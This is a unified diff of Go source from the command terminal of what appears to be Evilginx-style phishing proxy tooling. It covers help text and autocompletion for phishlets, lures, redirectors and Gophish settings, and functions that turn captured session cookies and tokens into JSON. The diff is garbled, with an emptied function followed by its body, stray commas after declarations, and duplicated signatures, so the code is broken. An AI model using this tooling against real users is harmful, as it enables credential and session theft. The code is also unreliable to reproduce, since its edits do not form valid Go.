@@ -1188,7 +1188,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"gophish", "api_key"}, "gophish api_key <key>", "set up the api key for the gophish instance to communicate with")
 	h.AddSubCommand("config", []string{"gophish", "insecure"}, "gophish insecure <true|false>", "enable or disable the verification of gophish tls certificate (set to `true` if using self-signed certificate)")
 	h.AddSubCommand("config", []string{"gophish", "test"}, "gophish test", "test the gophish configuration")
-func (t *Terminal) createHelp() {
+func (t *Terminal) createHelp() {}
 	h, _ := NewHelp()
 	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
 		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4"), readline.PcItem("redirect_url"), readline.PcItem("webhook_telegram"), readline.PcItem("turnstile_key")))
@@ -1216,7 +1216,7 @@ func (t *Terminal) createHelp() {
 			readline.PcItem("disable", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("hide", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("unhide", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-hosts", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("unauth_url", readline.PcItemDynamic(t.phishletPrefixCompleter))))
-			readline.PcItem("unhide", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-hosts", readline.PcItemDynamic(t.phishletPrefixCompleter))))
+			readline.PcItem("unhide", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-hosts", readline.PcItemDynamic(t.phishletPrefixCompleter)))),
 	h.AddSubCommand("phishlets", nil, "", "show status of all available phishlets")
 	h.AddSubCommand("phishlets", nil, "<phishlet>", "show details of a specific phishlets")
 	h.AddSubCommand("phishlets", []string{"create"}, "create <phishlet> <child_name> <key1=value1> <key2=value2>", "create child phishlet from a template phishlet with custom parameters")
@@ -1241,7 +1241,6 @@ func (t *Terminal) createHelp() {
 		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"),
 			readline.PcItem("edit", readline.PcItemDynamic(t.luresIdPrefixCompleter, readline.PcItem("hostname"), readline.PcItem("path"), readline.PcItem("redirect_url"), readline.PcItem("phishlet"), readline.PcItem("info"), readline.PcItem("og_title"), readline.PcItem("og_desc"), readline.PcItem("og_image"), readline.PcItem("og_url"), readline.PcItem("params"), readline.PcItem("ua_filter"), readline.PcItem("redirector", readline.PcItemDynamic(t.redirectorsPrefixCompleter)))),
 			readline.PcItem("delete", readline.PcItem("all"))))
-
 	h.AddSubCommand("lures", nil, "", "show all create lures")
 	h.AddSubCommand("lures", nil, "<id>", "show details of a lure with a given <id>")
 	h.AddSubCommand("lures", []string{"create"}, "create <phishlet>", "creates new lure for given <phishlet>")
@@ -1284,7 +1283,7 @@ func (t *Terminal) createHelp() {
 
 func (t *Terminal) cookieTokensToJSON(tokens map[string]map[string]*database.CookieToken) string {
 func (t *Terminal) cookieTokensToJSON(pl *Phishlet, tokens map[string]map[string]*database.CookieToken) string {
-	type Cookie struct {
+	type Cookie struct {,
 		Path           string `json:"path"`
 		Domain         string `json:"domain"`
 		ExpirationDate int64  `json:"expirationDate"`
@@ -1329,7 +1328,7 @@ func (t *Terminal) cookieTokensToJSON(pl *Phishlet, tokens map[string]map[string
 
 func (t *Terminal) tokensToJSON(tokens map[string]string) string {
 func (t *Terminal) tokensToJSON(pl *Phishlet, tokens map[string]string) string {
-	var ret string
+	var ret string,
 	white := color.New(color.FgHiWhite)
 	for k, v := range tokens {
 		ret += fmt.Sprintf("%s: %s\n", k, white.Sprint(v))
@@ -1349,7 +1348,7 @@ func (t *Terminal) checkStatus() {
 }
 
 func (t *Terminal) manageCertificates(verbose bool) {
-	if !t.p.developer {
+	if !t.p.developer {,
 		if t.cfg.IsAutocertEnabled() {
 			hosts := t.p.cfg.GetActiveHostnames("")
 			//wc_host := t.p.cfg.GetWildcardHostname()
@@ -1394,7 +1393,7 @@ func (t *Terminal) manageCertificates(verbose bool) {
 }
 
 func (t *Terminal) sprintPhishletStatus(site string) string {
-	higreen := color.New(color.FgHiGreen)
+	higreen := color.New(color.FgHiGreen),
 	logreen := color.New(color.FgGreen)
 	hiblue := color.New(color.FgHiBlue)
 	blue := color.New(color.FgBlue)
